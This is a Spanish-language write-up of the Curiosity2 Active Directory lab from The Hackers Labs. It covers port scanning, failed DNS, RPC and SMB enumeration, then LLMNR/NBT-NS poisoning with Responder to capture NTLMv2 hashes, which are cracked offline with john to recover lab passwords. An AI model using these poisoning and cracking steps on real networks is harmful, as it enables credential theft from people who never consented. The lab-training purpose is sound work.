---
description: >-
  Writeup de la máquina de dificultad media Curiosity2 de la página https://thehackerslabs.com
title: THL - Curiosity2 | (Difficulty Medium) - Windows
date: 2025-02-11
categories: [Writeup, The Hackers Labs]
tags: [thl, hacking, the hacker labs, active directory, llmnr, medium, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/c3d18551-9332-4324-a3c6-fe1f15a9c114
---

## Useful Skills

* DNS Enumeration
* RCP Enumeration
* SMB Enumeration
* LLMNR Poisoning

  
## Enumeration

### TCP Scan

```bash
rustscan -a 192.168.1.141 --ulimit 5000 -g
192.168.1.141 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49691,49692,49695,49703,49714,49750,57936]
```

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49691,49692,49695,49703,49714,49750,57936 -sCV 192.168.1.141 -oN tcpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 15:03 CET
Nmap scan report for 192.168.1.141 (192.168.1.141)
Host is up (0.00022s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-12 14:02:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-12T14:03:58+00:00; -41s from scanner time.
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-12T14:03:58+00:00; -41s from scanner time.
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
|_ssl-date: 2025-02-12T14:03:58+00:00; -41s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
|_ssl-date: 2025-02-12T14:03:58+00:00; -41s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
49750/tcp open  msrpc         Microsoft Windows RPC
57936/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-02-12T14:03:58+00:00; -41s from scanner time.
| ms-sql-info: 
|   192.168.1.141\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 57936
|_    Clustered: false
| ms-sql-ntlm-info: 
|   192.168.1.141\SQLEXPRESS: 
|     Target_Name: CONS
|     NetBIOS_Domain_Name: CONS
|     NetBIOS_Computer_Name: WIN-C73PROQLRHL
|     DNS_Domain_Name: cons.thl
|     DNS_Computer_Name: WIN-C73PROQLRHL.cons.thl
|_    Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
MAC Address: 08:00:27:33:E8:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: WIN-C73PROQLRHL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-12T14:03:50
|_  start_date: 2025-02-12T13:38:50
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:33:e8:5a (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: mean: -40s, deviation: 0s, median: -41s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.14 seconds
```

### UDP Scan

```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 192.168.1.141 -oN udpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 15:14 CET
Nmap scan report for 192.168.1.141
Host is up (0.00043s latency).
Not shown: 1327 open|filtered udp ports (no-response), 168 closed udp ports (port-unreach)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
137/udp open  netbios-ns
389/udp open  ldap
MAC Address: 08:00:27:33:E8:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
```

> Hay que añadir el dominio cons.thl y el FQDN WIN-C73PROQLRHL.cons.thl en el archivo de configuración /etc/hosts para que se pueda resolver el nombre de dominio a la dirección IP 192.168.1.141
{: .prompt-tip }


### DNS Enumeration

Intento obtener información adicional sobre el dominio a través de consultas DNS con dig, donde intento obtener los registros NS, MX, CNAME entre otros, posteriormente, trato de realizar una transferencia de zona, pero esta resulta fallida.

```bash
dig cons.thl@192.168.1.141 axfr
;; communications error to 212.230.135.1#53: connection reset
;; communications error to 212.230.135.1#53: connection reset

; <<>> DiG 9.20.4-4-Debian <<>> cons.thl@192.168.1.141 axfr
;; global options: +cmd
; Transfer failed.
```

### RPC Enumeration

Utilizo un null session para intentar enumerar información de todo los usuarios a través de RPC, pero el null session no se encuentra habilitado

```bash
rpcclient 192.168.1.141 -U "" -N -c enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

### SMB Enumeration

Utilizo NetExec para realizar un escaneo de SMB y obtener información clave como el sistema operativo, nombre del servidor, dominio, si la firma smb está habilita y si la versión antigua SMBv1 está activada o desactivada.

```bash
nxc smb 192.168.1.141
SMB  192.168.1.141  445  WIN-C73PROQLRHL  [*] Windows 10.0 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl)  (signing:True) (SMBv1:False)
```

Utilizo NetExec para enumerar los recursos compartidos del sistema a través del protocolo SMB con autenticación nula, pero no es posible

```bash
nxc smb 192.168.1.141 -u ' ' -p '' --shares
SMB  192.168.1.141  445  WIN-C73PROQLRHL  [*] Windows 10.0 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False)
SMB  192.168.1.141  445  WIN-C73PROQLRHL  [-] cons.thl\ : STATUS_LOGON_FAILURE
```

## Exploitation

### LLMNR Poisoning

Ejecuto la herramienta responder y la dejo en segundo plano, para así intentar capturar hashes NTLMv2 de usuarios autenticados en la red. Si algún usuario del dominio intenta acceder a un recurso de red (SMB, Servidor, Web, etc...) y por alguna razón el recurso no existe Windows intenta resolver el nombre usando LLMNR o NetBIOS, lo que desembocará en que Windows envíe las credenciales del usuario en forma de hash NTLMv2 a mi recurso falso.

```bash
python3 Responder.py -I eth0 -wd
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.1.1, now waiting for incoming requests...
[*] [NBT-NS] Poisoned answer sent to 192.168.1.141 for name SQLSERVER (service: File Server)
[*] [LLMNR]  Poisoned answer sent to fe80::3d0a:35b8:63ba:f20c for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.1.141 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::edbb:5300:a871:5b46 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.116 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::3d0a:35b8:63ba:f20c for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.1.141 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to fe80::edbb:5300:a871:5b46 for name SQLserver
[*] [LLMNR]  Poisoned answer sent to 192.168.56.116 for name SQLserver
[SMB] NTLMv2-SSP Client   : fe80::3d0a:35b8:63ba:f20c
[SMB] NTLMv2-SSP Username : cons\Appolonia
[SMB] NTLMv2-SSP Hash     : Appolonia::cons:75b0f3798ba586c9:B04333BF8D9A97F05004483C1A16B6A0:010100000000000080E74E8B637DDB0126D48CF562AB6DD70000000002000800550039004A005A0001001E00570049004E002D00370032003500390050005A004E00340042004500490004003400570049004E002D00370032003500390050005A004E0034004200450049002E00550039004A005A002E004C004F00430041004C0003001400550039004A005A002E004C004F00430041004C0005001400550039004A005A002E004C004F00430041004C000700080080E74E8B637DDB0106000400020000000800300030000000000000000000000000400000BB516A93EF2A74F2D3D59C325B808C11E36190226F6C34244A099287A4F019190A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
[*] [LLMNR]  Poisoned answer sent to fe80::3d0a:35b8:63ba:f20c for name SQLDatababase
[*] [NBT-NS] Poisoned answer sent to 192.168.1.141 for name SQLDATABABASE (service: File Server)
[*] [LLMNR]  Poisoned answer sent to 192.168.1.141 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to fe80::edbb:5300:a871:5b46 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to 192.168.56.116 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to fe80::3d0a:35b8:63ba:f20c for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to 192.168.1.141 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to fe80::edbb:5300:a871:5b46 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to 192.168.56.116 for name SQLDatababase
[SMB] NTLMv2-SSP Client   : fe80::3d0a:35b8:63ba:f20c
[SMB] NTLMv2-SSP Username : cons\sqldb
[SMB] NTLMv2-SSP Hash     : sqldb::cons:c8261e0addf2204d:0F73062D51212E6E7FAC095A398DAAAE:010100000000000080E74E8B637DDB012DF3F96799F1DC410000000002000800550039004A005A0001001E00570049004E002D00370032003500390050005A004E00340042004500490004003400570049004E002D00370032003500390050005A004E0034004200450049002E00550039004A005A002E004C004F00430041004C0003001400550039004A005A002E004C004F00430041004C0005001400550039004A005A002E004C004F00430041004C000700080080E74E8B637DDB0106000400020000000800300030000000000000000000000000400000BB516A93EF2A74F2D3D59C325B808C11E36190226F6C34244A099287A4F019190A001000000000000000000000000000000000000900240063006900660073002F00530051004C004400610074006100620061006200610073006500000000000000000000000000
```

Tras un rato de espera consigo obtener dos hashes NTLMv2, los cuals consigo crackear de forma offline con john, como no conseguía encontrar la contraseña utilice un bucle for que iterase sobre todos los diccionarios de la categoría Passwords de seclists, consiguiendo así crackear los hashes

```bash
for dict in /usr/share/seclists/Passwords/*.txt;do john --wordlist=$dict hashes;done
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
au7umn@          (sqldb)     
5umm3r@          (Appolonia)     
2g 0:00:00:00 DONE (2025-02-12 15:45) 50.00g/s 134750p/s 269500c/s 269500C/s $pr1ng..W!NTER2022$
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

